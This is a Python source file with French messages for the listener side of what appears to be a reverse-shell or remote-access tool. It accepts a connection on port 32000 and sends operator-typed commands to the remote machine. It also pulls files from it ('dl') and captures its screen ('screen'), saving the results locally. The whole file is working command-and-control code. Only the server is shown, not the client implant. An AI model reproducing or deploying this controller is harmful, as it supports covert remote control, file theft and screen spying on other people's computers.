""" SERVEUR """

import socket

HOST_IP = ""
HOST_PORT = 32000
MAX_DATA_SIZE = 1024

def socket_data(socket, data_len):
    current_data_len = 0
    total_data = None
    # print("socket_data len:", data_len)
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = socket.recv(chunk_len)
        # print("  len:", len(data))
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
        # print("  total len:", current_data_len, "/", data_len)
    return total_data

def socket_command(socket, command):
    if not command:  # if command == ""
        return None
    socket.sendall(command.encode())

    header_data = socket_data(socket, 13)
    longeur_data = int(header_data.decode())

    data_recues = socket_data(socket, longeur_data)
    return data_recues


log = socket.socket()
log.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
log.bind((HOST_IP, HOST_PORT))
log.listen()

print(f"Tentative de connexion sur {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_address = log.accept()
print(f"Connexion établie avec {client_address}")

dl_filename = None

while True:
    # ... infos
    infos_data = socket_command(connection_socket, "system")
    if not infos_data:
        break
    commande = input(client_address[0]+":"+str(client_address[1])+ " " + 
    infos_data.decode() + " > ")

    commande_split = commande.split(" ")
    if len(commande_split) == 2 and commande_split[0] == "dl":
        dl_filename = commande_split[1]
    elif len(commande_split) == 2 and commande_split[0] == "screen":
        dl_filename = commande_split[1] + ".png"

    data_recues = socket_command(connection_socket, commande)
    if not data_recues:
        break

    if dl_filename:
        if len(data_recues) == 1 and data_recues == b" ":
            print("ERREUR: Le fichier", dl_filename, "n'existe pas")
        else:
            f = open(dl_filename, "wb")
            f.write(data_recues)
            f.close()
            print("Fichier", dl_filename, "téléchargé.")
        dl_filename = None
    else:
        print(data_recues.decode())

log.close()
connection_socket.close()